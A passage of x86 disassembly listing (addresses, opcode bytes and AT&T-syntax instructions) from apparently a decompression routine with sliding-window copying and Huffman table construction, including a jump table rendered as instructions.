  4072da:	0f b6 11             	movzbl (%ecx),%edx
  4072dd:	8b cb                	mov    %ebx,%ecx
  4072df:	d3 e2                	shl    %cl,%edx
  4072e1:	09 55 c0             	or     %edx,-0x40(%ebp)
  4072e4:	ff 45 c8             	incl   -0x38(%ebp)
  4072e7:	83 c3 08             	add    $0x8,%ebx
  4072ea:	3b d8                	cmp    %eax,%ebx
  4072ec:	72 dc                	jb     0x4072ca
  4072ee:	0f b7 0c 45 c4 a5 40 	movzwl 0x40a5c4(,%eax,2),%ecx
  4072f5:	00 
  4072f6:	23 4d c0             	and    -0x40(%ebp),%ecx
  4072f9:	01 4e 0c             	add    %ecx,0xc(%esi)
  4072fc:	8b c8                	mov    %eax,%ecx
  4072fe:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  407301:	2b d8                	sub    %eax,%ebx
  407303:	c7 06 05 00 00 00    	movl   $0x5,(%esi)
  407309:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40730c:	8b 56 0c             	mov    0xc(%esi),%edx
  40730f:	8b c8                	mov    %eax,%ecx
  407311:	2b ce                	sub    %esi,%ecx
  407313:	81 e9 a0 1b 00 00    	sub    $0x1ba0,%ecx
  407319:	3b ca                	cmp    %edx,%ecx
  40731b:	73 13                	jae    0x407330
  40731d:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  407323:	2b ca                	sub    %edx,%ecx
  407325:	2b ce                	sub    %esi,%ecx
  407327:	8d 8c 01 60 e4 ff ff 	lea    -0x1ba0(%ecx,%eax,1),%ecx
  40732e:	eb 04                	jmp    0x407334
  407330:	8b c8                	mov    %eax,%ecx
  407332:	2b ca                	sub    %edx,%ecx
  407334:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  407338:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40733b:	0f 84 90 f9 ff ff    	je     0x406cd1
  407341:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  407344:	85 ff                	test   %edi,%edi
  407346:	0f 85 91 00 00 00    	jne    0x4073dd
  40734c:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  407352:	3b c7                	cmp    %edi,%eax
  407354:	75 23                	jne    0x407379
  407356:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  40735c:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  407362:	3b ca                	cmp    %edx,%ecx
  407364:	74 13                	je     0x407379
  407366:	8b c2                	mov    %edx,%eax
  407368:	3b c1                	cmp    %ecx,%eax
  40736a:	73 07                	jae    0x407373
  40736c:	2b c8                	sub    %eax,%ecx
  40736e:	49                   	dec    %ecx
  40736f:	8b f9                	mov    %ecx,%edi
  407371:	eb 02                	jmp    0x407375
  407373:	2b f8                	sub    %eax,%edi
  407375:	85 ff                	test   %edi,%edi
  407377:	75 64                	jne    0x4073dd
  407379:	ff 75 08             	push   0x8(%ebp)
  40737c:	89 86 a8 9b 00 00    	mov    %eax,0x9ba8(%esi)
  407382:	e8 09 02 00 00       	call   0x407590
  407387:	8b 86 a8 9b 00 00    	mov    0x9ba8(%esi),%eax
  40738d:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  407393:	3b c1                	cmp    %ecx,%eax
  407395:	89 45 d0             	mov    %eax,-0x30(%ebp)
  407398:	73 07                	jae    0x4073a1
  40739a:	8b f9                	mov    %ecx,%edi
  40739c:	2b f8                	sub    %eax,%edi
  40739e:	4f                   	dec    %edi
  40739f:	eb 08                	jmp    0x4073a9
  4073a1:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  4073a7:	2b f8                	sub    %eax,%edi
  4073a9:	8b 96 a0 9b 00 00    	mov    0x9ba0(%esi),%edx
  4073af:	3b c2                	cmp    %edx,%eax
  4073b1:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4073b4:	75 1f                	jne    0x4073d5
  4073b6:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  4073bc:	3b ca                	cmp    %edx,%ecx
  4073be:	74 15                	je     0x4073d5
  4073c0:	8b c2                	mov    %edx,%eax
  4073c2:	3b c1                	cmp    %ecx,%eax
  4073c4:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4073c7:	73 07                	jae    0x4073d0
  4073c9:	2b c8                	sub    %eax,%ecx
  4073cb:	49                   	dec    %ecx
  4073cc:	8b f9                	mov    %ecx,%edi
  4073ce:	eb 05                	jmp    0x4073d5
  4073d0:	8b 7d f8             	mov    -0x8(%ebp),%edi
  4073d3:	2b f8                	sub    %eax,%edi
  4073d5:	85 ff                	test   %edi,%edi
  4073d7:	0f 84 64 01 00 00    	je     0x407541
  4073dd:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4073e0:	8a 11                	mov    (%ecx),%dl
  4073e2:	88 10                	mov    %dl,(%eax)
  4073e4:	40                   	inc    %eax
  4073e5:	41                   	inc    %ecx
  4073e6:	4f                   	dec    %edi
  4073e7:	3b 8e a0 9b 00 00    	cmp    0x9ba0(%esi),%ecx
  4073ed:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4073f0:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4073f3:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  4073f6:	75 09                	jne    0x407401
  4073f8:	8d 8e a0 1b 00 00    	lea    0x1ba0(%esi),%ecx
  4073fe:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  407401:	ff 4e 04             	decl   0x4(%esi)
  407404:	0f 85 3a ff ff ff    	jne    0x407344
  40740a:	e9 c2 f8 ff ff       	jmp    0x406cd1
  40740f:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407412:	8b 7d d0             	mov    -0x30(%ebp),%edi
  407415:	85 c0                	test   %eax,%eax
  407417:	0f 85 91 00 00 00    	jne    0x4074ae
  40741d:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  407423:	3b f9                	cmp    %ecx,%edi
  407425:	75 23                	jne    0x40744a
  407427:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  40742d:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  407433:	3b c2                	cmp    %edx,%eax
  407435:	74 13                	je     0x40744a
  407437:	8b fa                	mov    %edx,%edi
  407439:	3b f8                	cmp    %eax,%edi
  40743b:	73 05                	jae    0x407442
  40743d:	2b c7                	sub    %edi,%eax
  40743f:	48                   	dec    %eax
  407440:	eb 04                	jmp    0x407446
  407442:	2b cf                	sub    %edi,%ecx
  407444:	8b c1                	mov    %ecx,%eax
  407446:	85 c0                	test   %eax,%eax
  407448:	75 64                	jne    0x4074ae
  40744a:	ff 75 08             	push   0x8(%ebp)
  40744d:	89 be a8 9b 00 00    	mov    %edi,0x9ba8(%esi)
  407453:	e8 38 01 00 00       	call   0x407590
  407458:	8b be a8 9b 00 00    	mov    0x9ba8(%esi),%edi
  40745e:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  407464:	3b f9                	cmp    %ecx,%edi
  407466:	89 7d d0             	mov    %edi,-0x30(%ebp)
  407469:	73 07                	jae    0x407472
  40746b:	8b c1                	mov    %ecx,%eax
  40746d:	2b c7                	sub    %edi,%eax
  40746f:	48                   	dec    %eax
  407470:	eb 08                	jmp    0x40747a
  407472:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  407478:	2b c7                	sub    %edi,%eax
  40747a:	8b 96 a0 9b 00 00    	mov    0x9ba0(%esi),%edx
  407480:	3b fa                	cmp    %edx,%edi
  407482:	89 55 f8             	mov    %edx,-0x8(%ebp)
  407485:	75 1f                	jne    0x4074a6
  407487:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  40748d:	3b ca                	cmp    %edx,%ecx
  40748f:	74 15                	je     0x4074a6
  407491:	8b fa                	mov    %edx,%edi
  407493:	3b f9                	cmp    %ecx,%edi
  407495:	89 7d d0             	mov    %edi,-0x30(%ebp)
  407498:	73 07                	jae    0x4074a1
  40749a:	2b cf                	sub    %edi,%ecx
  40749c:	49                   	dec    %ecx
  40749d:	8b c1                	mov    %ecx,%eax
  40749f:	eb 05                	jmp    0x4074a6
  4074a1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4074a4:	2b c7                	sub    %edi,%eax
  4074a6:	85 c0                	test   %eax,%eax
  4074a8:	0f 84 93 00 00 00    	je     0x407541
  4074ae:	8a 4e 08             	mov    0x8(%esi),%cl
  4074b1:	88 0f                	mov    %cl,(%edi)
  4074b3:	47                   	inc    %edi
  4074b4:	48                   	dec    %eax
  4074b5:	89 7d d0             	mov    %edi,-0x30(%ebp)
  4074b8:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4074bb:	e9 11 f8 ff ff       	jmp    0x406cd1
  4074c0:	83 fb 07             	cmp    $0x7,%ebx
  4074c3:	76 09                	jbe    0x4074ce
  4074c5:	83 eb 08             	sub    $0x8,%ebx
  4074c8:	ff 45 cc             	incl   -0x34(%ebp)
  4074cb:	ff 4d c8             	decl   -0x38(%ebp)
  4074ce:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4074d1:	ff 75 08             	push   0x8(%ebp)
  4074d4:	89 86 a8 9b 00 00    	mov    %eax,0x9ba8(%esi)
  4074da:	e8 b1 00 00 00       	call   0x407590
  4074df:	8b 8e a8 9b 00 00    	mov    0x9ba8(%esi),%ecx
  4074e5:	8b 96 a4 9b 00 00    	mov    0x9ba4(%esi),%edx
  4074eb:	3b ca                	cmp    %edx,%ecx
  4074ed:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  4074f0:	73 07                	jae    0x4074f9
  4074f2:	8b c2                	mov    %edx,%eax
  4074f4:	2b c1                	sub    %ecx,%eax
  4074f6:	48                   	dec    %eax
  4074f7:	eb 08                	jmp    0x407501
  4074f9:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  4074ff:	2b c1                	sub    %ecx,%eax
  407501:	3b ca                	cmp    %edx,%ecx
  407503:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  407506:	75 39                	jne    0x407541
  407508:	8b 86 14 05 00 00    	mov    0x514(%esi),%eax
  40750e:	83 f8 08             	cmp    $0x8,%eax
  407511:	89 06                	mov    %eax,(%esi)
  407513:	75 33                	jne    0x407548
  407515:	8b 06                	mov    (%esi),%eax
  407517:	83 f8 0f             	cmp    $0xf,%eax
  40751a:	0f 86 32 f6 ff ff    	jbe    0x406b52
  407520:	e9 93 f6 ff ff       	jmp    0x406bb8
  407525:	8b 45 c0             	mov    -0x40(%ebp),%eax
  407528:	33 ff                	xor    %edi,%edi
  40752a:	89 86 1c 05 00 00    	mov    %eax,0x51c(%esi)
  407530:	8b 45 08             	mov    0x8(%ebp),%eax
  407533:	89 9e 18 05 00 00    	mov    %ebx,0x518(%esi)
  407539:	89 78 04             	mov    %edi,0x4(%eax)
  40753c:	e9 98 f6 ff ff       	jmp    0x406bd9
  407541:	33 ff                	xor    %edi,%edi
  407543:	e9 79 f6 ff ff       	jmp    0x406bc1
  407548:	33 ff                	xor    %edi,%edi
  40754a:	47                   	inc    %edi
  40754b:	e9 71 f6 ff ff       	jmp    0x406bc1
  407550:	4d                   	dec    %ebp
  407551:	71 40                	jno    0x407593
  407553:	00 60 71             	add    %ah,0x71(%eax)
  407556:	40                   	inc    %eax
  407557:	00 f6                	add    %dh,%dh
  407559:	71 40                	jno    0x40759b
  40755b:	00 47 72             	add    %al,0x72(%edi)
  40755e:	40                   	inc    %eax
  40755f:	00 c5                	add    %al,%ch
  407561:	72 40                	jb     0x4075a3
  407563:	00 09                	add    %cl,(%ecx)
  407565:	73 40                	jae    0x4075a7
  407567:	00 0f                	add    %cl,(%edi)
  407569:	74 40                	je     0x4075ab
  40756b:	00 c0                	add    %al,%al
  40756d:	74 40                	je     0x4075af
  40756f:	00 79 6b             	add    %bh,0x6b(%ecx)
  407572:	40                   	inc    %eax
  407573:	00 0e                	add    %cl,(%esi)
  407575:	6d                   	insl   (%dx),%es:(%edi)
  407576:	40                   	inc    %eax
  407577:	00 33                	add    %dh,(%ebx)
  407579:	6d                   	insl   (%dx),%es:(%edi)
  40757a:	40                   	inc    %eax
  40757b:	00 41 6e             	add    %al,0x6e(%ecx)
  40757e:	40                   	inc    %eax
  40757f:	00 80 6e 40 00 63    	add    %al,0x6300406e(%eax)
  407585:	70 40                	jo     0x4075c7
  407587:	00 b8 6b 40 00 ce    	add    %bh,-0x31ffbf95(%eax)
  40758d:	74 40                	je     0x4075cf
  40758f:	00 53 56             	add    %dl,0x56(%ebx)
  407592:	8b 74 24 0c          	mov    0xc(%esp),%esi
  407596:	57                   	push   %edi
  407597:	8b be b4 9b 00 00    	mov    0x9bb4(%esi),%edi
  40759d:	8b 9e b8 9b 00 00    	mov    0x9bb8(%esi),%ebx
  4075a3:	3b fb                	cmp    %ebx,%edi
  4075a5:	76 06                	jbe    0x4075ad
  4075a7:	8b 9e b0 9b 00 00    	mov    0x9bb0(%esi),%ebx
  4075ad:	8b 46 0c             	mov    0xc(%esi),%eax
  4075b0:	2b df                	sub    %edi,%ebx
  4075b2:	3b d8                	cmp    %eax,%ebx
  4075b4:	72 02                	jb     0x4075b8
  4075b6:	8b d8                	mov    %eax,%ebx
  4075b8:	53                   	push   %ebx
  4075b9:	57                   	push   %edi
  4075ba:	ff 76 08             	push   0x8(%esi)
  4075bd:	2b c3                	sub    %ebx,%eax
  4075bf:	89 46 0c             	mov    %eax,0xc(%esi)
  4075c2:	e8 96 ea ff ff       	call   0x40605d
  4075c7:	01 5e 08             	add    %ebx,0x8(%esi)
  4075ca:	8b 86 b0 9b 00 00    	mov    0x9bb0(%esi),%eax
  4075d0:	03 fb                	add    %ebx,%edi
  4075d2:	3b f8                	cmp    %eax,%edi
  4075d4:	75 16                	jne    0x4075ec
  4075d6:	39 86 b8 9b 00 00    	cmp    %eax,0x9bb8(%esi)
  4075dc:	8d be b0 1b 00 00    	lea    0x1bb0(%esi),%edi
  4075e2:	75 b9                	jne    0x40759d
  4075e4:	89 be b8 9b 00 00    	mov    %edi,0x9bb8(%esi)
  4075ea:	eb b1                	jmp    0x40759d
  4075ec:	89 be b4 9b 00 00    	mov    %edi,0x9bb4(%esi)
  4075f2:	5f                   	pop    %edi
  4075f3:	5e                   	pop    %esi
  4075f4:	5b                   	pop    %ebx
  4075f5:	c2 04 00             	ret    $0x4
  4075f8:	55                   	push   %ebp
  4075f9:	8b ec                	mov    %esp,%ebp
  4075fb:	81 ec ec 00 00 00    	sub    $0xec,%esp
  407601:	53                   	push   %ebx
  407602:	56                   	push   %esi
  407603:	8b 75 0c             	mov    0xc(%ebp),%esi
  407606:	57                   	push   %edi
  407607:	6a 10                	push   $0x10
  407609:	33 c0                	xor    %eax,%eax
  40760b:	59                   	pop    %ecx
  40760c:	8d 7d 90             	lea    -0x70(%ebp),%edi
  40760f:	f3 ab                	rep stos %eax,%es:(%edi)
  407611:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407614:	8b d6                	mov    %esi,%edx
  407616:	8b 01                	mov    (%ecx),%eax
  407618:	83 c1 04             	add    $0x4,%ecx
  40761b:	8d 44 85 90          	lea    -0x70(%ebp,%eax,4),%eax
  40761f:	ff 00                	incl   (%eax)
  407621:	4a                   	dec    %edx
  407622:	75 f2                	jne    0x407616
  407624:	39 75 90             	cmp    %esi,-0x70(%ebp)
  407627:	75 13                	jne    0x40763c
  407629:	8b 45 1c             	mov    0x1c(%ebp),%eax
  40762c:	83 20 00             	andl   $0x0,(%eax)
  40762f:	8b 45 20             	mov    0x20(%ebp),%eax
  407632:	83 20 00             	andl   $0x0,(%eax)
  407635:	33 c0                	xor    %eax,%eax
  407637:	e9 f0 02 00 00       	jmp    0x40792c
  40763c:	8b 75 20             	mov    0x20(%ebp),%esi
  40763f:	33 db                	xor    %ebx,%ebx
  407641:	43                   	inc    %ebx
  407642:	6a 0f                	push   $0xf
  407644:	8b 3e                	mov    (%esi),%edi
  407646:	8b cb                	mov    %ebx,%ecx
  407648:	89 7d 20             	mov    %edi,0x20(%ebp)
  40764b:	5a                   	pop    %edx
  40764c:	33 c0                	xor    %eax,%eax
  40764e:	39 44 8d 90          	cmp    %eax,-0x70(%ebp,%ecx,4)
  407652:	75 05                	jne    0x407659
  407654:	41                   	inc    %ecx
  407655:	3b ca                	cmp    %edx,%ecx
  407657:	76 f3                	jbe    0x40764c
  407659:	3b f9                	cmp    %ecx,%edi
  40765b:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40765e:	73 03                	jae    0x407663
  407660:	89 4d 20             	mov    %ecx,0x20(%ebp)
  407663:	39 44 95 90          	cmp    %eax,-0x70(%ebp,%edx,4)
  407667:	75 03                	jne    0x40766c
  407669:	4a                   	dec    %edx
  40766a:	75 f7                	jne    0x407663
  40766c:	39 55 20             	cmp    %edx,0x20(%ebp)
  40766f:	89 55 e8             	mov    %edx,-0x18(%ebp)
  407672:	76 03                	jbe    0x407677
  407674:	89 55 20             	mov    %edx,0x20(%ebp)
  407677:	8b 7d 20             	mov    0x20(%ebp),%edi
  40767a:	89 3e                	mov    %edi,(%esi)
  40767c:	d3 e3                	shl    %cl,%ebx
  40767e:	eb 0d                	jmp    0x40768d
  407680:	2b 5c 8d 90          	sub    -0x70(%ebp,%ecx,4),%ebx
  407684:	0f 88 9f 02 00 00    	js     0x407929
  40768a:	41                   	inc    %ecx
  40768b:	03 db                	add    %ebx,%ebx
  40768d:	3b ca                	cmp    %edx,%ecx
  40768f:	72 ef                	jb     0x407680
  407691:	8b f2                	mov    %edx,%esi
  407693:	c1 e6 02             	shl    $0x2,%esi
  407696:	8d 4c 35 90          	lea    -0x70(%ebp,%esi,1),%ecx
  40769a:	8b 39                	mov    (%ecx),%edi
  40769c:	2b df                	sub    %edi,%ebx
  40769e:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  4076a1:	0f 88 82 02 00 00    	js     0x407929
  4076a7:	03 fb                	add    %ebx,%edi
  4076a9:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  4076af:	89 39                	mov    %edi,(%ecx)
  4076b1:	33 c9                	xor    %ecx,%ecx
  4076b3:	4a                   	dec    %edx
  4076b4:	74 13                	je     0x4076c9
  4076b6:	33 ff                	xor    %edi,%edi
  4076b8:	03 4c 3d 94          	add    -0x6c(%ebp,%edi,1),%ecx
  4076bc:	83 c7 04             	add    $0x4,%edi
  4076bf:	4a                   	dec    %edx
  4076c0:	89 8c 3d 54 ff ff ff 	mov    %ecx,-0xac(%ebp,%edi,1)
  4076c7:	75 ef                	jne    0x4076b8
  4076c9:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4076cc:	33 ff                	xor    %edi,%edi
  4076ce:	8b 0b                	mov    (%ebx),%ecx
  4076d0:	83 c3 04             	add    $0x4,%ebx
  4076d3:	3b c8                	cmp    %eax,%ecx
  4076d5:	74 13                	je     0x4076ea
  4076d7:	8d 8c 8d 50 ff ff ff 	lea    -0xb0(%ebp,%ecx,4),%ecx
  4076de:	8b 11                	mov    (%ecx),%edx
  4076e0:	89 3c 95 90 19 43 00 	mov    %edi,0x431990(,%edx,4)
  4076e7:	42                   	inc    %edx
  4076e8:	89 11                	mov    %edx,(%ecx)
  4076ea:	47                   	inc    %edi
  4076eb:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  4076ee:	72 de                	jb     0x4076ce
  4076f0:	8b 8c 35 50 ff ff ff 	mov    -0xb0(%ebp,%esi,1),%ecx
  4076f7:	8b 5d 20             	mov    0x20(%ebp),%ebx
  4076fa:	83 4d f4 ff          	orl    $0xffffffff,-0xc(%ebp)
  4076fe:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  407702:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  407705:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407708:	f7 db                	neg    %ebx
  40770a:	3b 4d e8             	cmp    -0x18(%ebp),%ecx
  40770d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  407710:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  407716:	c7 45 e0 90 19 43 00 	movl   $0x431990,-0x20(%ebp)
  40771d:	89 85 14 ff ff ff    	mov    %eax,-0xec(%ebp)
  407723:	0f 8f f3 01 00 00    	jg     0x40791c
  407729:	8d 51 ff             	lea    -0x1(%ecx),%edx
  40772c:	8d 4c 8d 90          	lea    -0x70(%ebp,%ecx,4),%ecx
  407730:	89 55 d8             	mov    %edx,-0x28(%ebp)
  407733:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  407736:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  407739:	8b 31                	mov    (%ecx),%esi
  40773b:	85 f6                	test   %esi,%esi
  40773d:	0f 84 c3 01 00 00    	je     0x407906
  407743:	eb 03                	jmp    0x407748
  407745:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  407748:	8b 4d 20             	mov    0x20(%ebp),%ecx
  40774b:	4e                   	dec    %esi
  40774c:	03 cb                	add    %ebx,%ecx
  40774e:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  407751:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  407754:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  407757:	0f 8e cc 00 00 00    	jle    0x407829
  40775d:	46                   	inc    %esi
  40775e:	89 75 f0             	mov    %esi,-0x10(%ebp)
  407761:	8b 75 e8             	mov    -0x18(%ebp),%esi
  407764:	ff 45 f4             	incl   -0xc(%ebp)
  407767:	2b 75 ec             	sub    -0x14(%ebp),%esi
  40776a:	3b 75 20             	cmp    0x20(%ebp),%esi
  40776d:	76 03                	jbe    0x407772
  40776f:	8b 75 20             	mov    0x20(%ebp),%esi
  407772:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407775:	33 d2                	xor    %edx,%edx
  407777:	2b 4d ec             	sub    -0x14(%ebp),%ecx
  40777a:	42                   	inc    %edx
  40777b:	d3 e2                	shl    %cl,%edx
  40777d:	3b 55 f0             	cmp    -0x10(%ebp),%edx
  407780:	76 23                	jbe    0x4077a5
  407782:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  407785:	83 c8 ff             	or     $0xffffffff,%eax
  407788:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  40778b:	03 d0                	add    %eax,%edx
  40778d:	3b ce                	cmp    %esi,%ecx
  40778f:	73 14                	jae    0x4077a5
  407791:	eb 0d                	jmp    0x4077a0
  407793:	83 c7 04             	add    $0x4,%edi
  407796:	03 d2                	add    %edx,%edx
  407798:	8b 07                	mov    (%edi),%eax
  40779a:	3b d0                	cmp    %eax,%edx
  40779c:	76 07                	jbe    0x4077a5
  40779e:	2b d0                	sub    %eax,%edx
  4077a0:	41                   	inc    %ecx
  4077a1:	3b ce                	cmp    %esi,%ecx
  4077a3:	72 ee                	jb     0x407793
  4077a5:	8b 55 28             	mov    0x28(%ebp),%edx
  4077a8:	33 c0                	xor    %eax,%eax
  4077aa:	40                   	inc    %eax
  4077ab:	8b 12                	mov    (%edx),%edx
  4077ad:	d3 e0                	shl    %cl,%eax
  4077af:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4077b2:	8d 3c 02             	lea    (%edx,%eax,1),%edi
  4077b5:	81 ff a0 05 00 00    	cmp    $0x5a0,%edi
  4077bb:	0f 87 68 01 00 00    	ja     0x407929
  4077c1:	8b 45 24             	mov    0x24(%ebp),%eax
  4077c4:	8d 04 90             	lea    (%eax,%edx,4),%eax
  4077c7:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4077ca:	8d b4 95 14 ff ff ff 	lea    -0xec(%ebp,%edx,4),%esi
  4077d1:	8b 55 28             	mov    0x28(%ebp),%edx
  4077d4:	89 3a                	mov    %edi,(%edx)
  4077d6:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4077d9:	85 d2                	test   %edx,%edx
  4077db:	89 06                	mov    %eax,(%esi)
  4077dd:	74 31                	je     0x407810
  4077df:	8b 7d f8             	mov    -0x8(%ebp),%edi
  4077e2:	8b 76 fc             	mov    -0x4(%esi),%esi
  4077e5:	89 bc 95 50 ff ff ff 	mov    %edi,-0xb0(%ebp,%edx,4)
  4077ec:	8a 55 20             	mov    0x20(%ebp),%dl
  4077ef:	88 55 09             	mov    %dl,0x9(%ebp)
  4077f2:	88 4d 08             	mov    %cl,0x8(%ebp)
  4077f5:	8b d7                	mov    %edi,%edx
  4077f7:	8b cb                	mov    %ebx,%ecx
  4077f9:	d3 ea                	shr    %cl,%edx
  4077fb:	8b c8                	mov    %eax,%ecx
  4077fd:	2b ce                	sub    %esi,%ecx
  4077ff:	c1 f9 02             	sar    $0x2,%ecx
  407802:	2b ca                	sub    %edx,%ecx
  407804:	66 89 4d 0a          	mov    %cx,0xa(%ebp)
  407808:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40780b:	89 0c 96             	mov    %ecx,(%esi,%edx,4)
  40780e:	eb 05                	jmp    0x407815
  407810:	8b 4d 1c             	mov    0x1c(%ebp),%ecx
  407813:	89 01                	mov    %eax,(%ecx)
  407815:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407818:	8b d9                	mov    %ecx,%ebx
  40781a:	03 4d 20             	add    0x20(%ebp),%ecx
  40781d:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  407820:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  407823:	0f 8f 38 ff ff ff    	jg     0x407761
  407829:	8a 4d fc             	mov    -0x4(%ebp),%cl
  40782c:	8b 75 e0             	mov    -0x20(%ebp),%esi
  40782f:	2a cb                	sub    %bl,%cl
  407831:	88 4d 09             	mov    %cl,0x9(%ebp)
  407834:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  407837:	8d 0c 8d 90 19 43 00 	lea    0x431990(,%ecx,4),%ecx
  40783e:	3b f1                	cmp    %ecx,%esi
  407840:	72 06                	jb     0x407848
  407842:	c6 45 08 c0          	movb   $0xc0,0x8(%ebp)
  407846:	eb 43                	jmp    0x40788b
  407848:	8b 0e                	mov    (%esi),%ecx
  40784a:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  40784d:	73 1c                	jae    0x40786b
  40784f:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  407855:	0f 92 c1             	setb   %cl
  407858:	fe c9                	dec    %cl
  40785a:	83 e1 60             	and    $0x60,%ecx
  40785d:	88 4d 08             	mov    %cl,0x8(%ebp)
  407860:	66 8b 0e             	mov    (%esi),%cx
  407863:	83 c6 04             	add    $0x4,%esi
  407866:	89 75 e0             	mov    %esi,-0x20(%ebp)
  407869:	eb 1c                	jmp    0x407887
  40786b:	2b 4d 10             	sub    0x10(%ebp),%ecx
  40786e:	8b 55 18             	mov    0x18(%ebp),%edx
  407871:	03 c9                	add    %ecx,%ecx
  407873:	8a 14 11             	mov    (%ecx,%edx,1),%dl
  407876:	80 c2 50             	add    $0x50,%dl
  407879:	83 45 e0 04          	addl   $0x4,-0x20(%ebp)
  40787d:	88 55 08             	mov    %dl,0x8(%ebp)
  407880:	8b 55 14             	mov    0x14(%ebp),%edx
  407883:	66 8b 0c 11          	mov    (%ecx,%edx,1),%cx
  407887:	66 89 4d 0a          	mov    %cx,0xa(%ebp)
  40788b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40788e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407891:	33 ff                	xor    %edi,%edi
  407893:	2b cb                	sub    %ebx,%ecx
  407895:	47                   	inc    %edi
  407896:	8b f7                	mov    %edi,%esi
  407898:	d3 e6                	shl    %cl,%esi
  40789a:	8b cb                	mov    %ebx,%ecx
  40789c:	d3 ea                	shr    %cl,%edx
  40789e:	eb 08                	jmp    0x4078a8
  4078a0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4078a3:	89 0c 90             	mov    %ecx,(%eax,%edx,4)
  4078a6:	03 d6                	add    %esi,%edx
  4078a8:	3b 55 dc             	cmp    -0x24(%ebp),%edx
  4078ab:	72 f3                	jb     0x4078a0
  4078ad:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4078b0:	8b 75 f8             	mov    -0x8(%ebp),%esi
  4078b3:	8b d7                	mov    %edi,%edx
  4078b5:	d3 e2                	shl    %cl,%edx
  4078b7:	eb 04                	jmp    0x4078bd
  4078b9:	33 f2                	xor    %edx,%esi
  4078bb:	d1 ea                	shr    $1,%edx
  4078bd:	85 d6                	test   %edx,%esi
  4078bf:	75 f8                	jne    0x4078b9
  4078c1:	8b cf                	mov    %edi,%ecx
  4078c3:	33 f2                	xor    %edx,%esi
  4078c5:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4078c8:	8b cb                	mov    %ebx,%ecx
  4078ca:	8b d7                	mov    %edi,%edx
  4078cc:	89 75 f8             	mov    %esi,-0x8(%ebp)
  4078cf:	d3 e2                	shl    %cl,%edx
  4078d1:	4a                   	dec    %edx
  4078d2:	23 d6                	and    %esi,%edx
  4078d4:	8b ca                	mov    %edx,%ecx
  4078d6:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4078d9:	3b 8c 95 50 ff ff ff 	cmp    -0xb0(%ebp,%edx,4),%ecx
  4078e0:	74 1a                	je     0x4078fc
  4078e2:	2b 5d 20             	sub    0x20(%ebp),%ebx
  4078e5:	8b f7                	mov    %edi,%esi
  4078e7:	4a                   	dec    %edx
  4078e8:	8b cb                	mov    %ebx,%ecx
  4078ea:	d3 e6                	shl    %cl,%esi
  4078ec:	4e                   	dec    %esi
  4078ed:	23 75 f8             	and    -0x8(%ebp),%esi
  4078f0:	3b b4 95 50 ff ff ff 	cmp    -0xb0(%ebp,%edx,4),%esi
  4078f7:	75 e9                	jne    0x4078e2
  4078f9:	89 55 f4             	mov    %edx,-0xc(%ebp)
